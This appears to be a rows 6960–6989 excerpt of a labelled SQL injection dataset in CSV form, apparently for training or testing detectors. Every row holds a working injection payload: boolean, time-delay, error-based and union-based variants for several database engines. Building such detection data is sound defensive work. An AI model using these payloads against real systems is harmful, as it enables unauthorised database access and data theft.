row_index,payload_norm,label,sqli_type_hint
6960,-4873' ) ) ) or 3038 = 3038,1,
6961,1' ) as njfg where 6392 = 6392 waitfor delay '0:0:5'--,1,
6962,1' and 7533 = 7533 and 'jwgc' = 'jwgc,1,
6963,select ( case when ( 2132 = 8969 ) then 1 else 2132* ( select 2132 from master..sysdatabases ) end ) --,1,
6964,"1' ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
6965,"1' ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( 'vjnf' like 'vjnf",1,
6966,"-2359' union all select 2687,2687,2687#",1,
6967,1 ) where 2940 = 2940,1,
6968,"1"" ) as yggn where 1006 = 1006 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",1,
6969,-4184' ) ) ) or 2579 = 4654#,1,
6970,"1 ) where 8338 = 8338 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,
6971,"1%' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( '%' = '",1,
6972,"1'|| ( select 'qued' where 9801 = 9801 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
6973,"1%' ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
6974,"1"" ) as kzuq where 4259 = 4259",1,
6975,"1"" ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ""lsca"" like ""lsca",1,
6976,1' in boolean mode ) and ( 8610 = 2985 ) *2985#,1,
6977,1' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( 'npzh' = 'npzh,1,
6978,"1%' ) ) union all select null,null,null,null,null,null,null#",1,
6979,"-3979' in boolean mode ) union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#",1,
6980,"1' ) ) as ewsw where 4667 = 4667 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
6981,waitfor delay '0:0:5' and 'fjpf' like 'fjpf,1,
6982,1' ) ) and sleep ( 5 ) and ( ( 'tcwt' = 'tcwt,1,
6983,"1"" where 3434 = 3434",1,
6984,"1' ) ) ) and make_set ( 9514 = 8668,8668 ) and ( ( ( 'sgjj' like 'sgjj",1,
6985,"-7036%' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and '%' = '",1,
6986,-9893' or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'pbop' = 'pbop,1,
6987,"1 ) ) as xvyi where 6701 = 6701 union all select null,null,null,null#",1,
6988,"-7006' where 6966 = 6966 union all select 6966,6966,6966,6966#",1,
6989,"1' where 8083 = 8083 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",1,
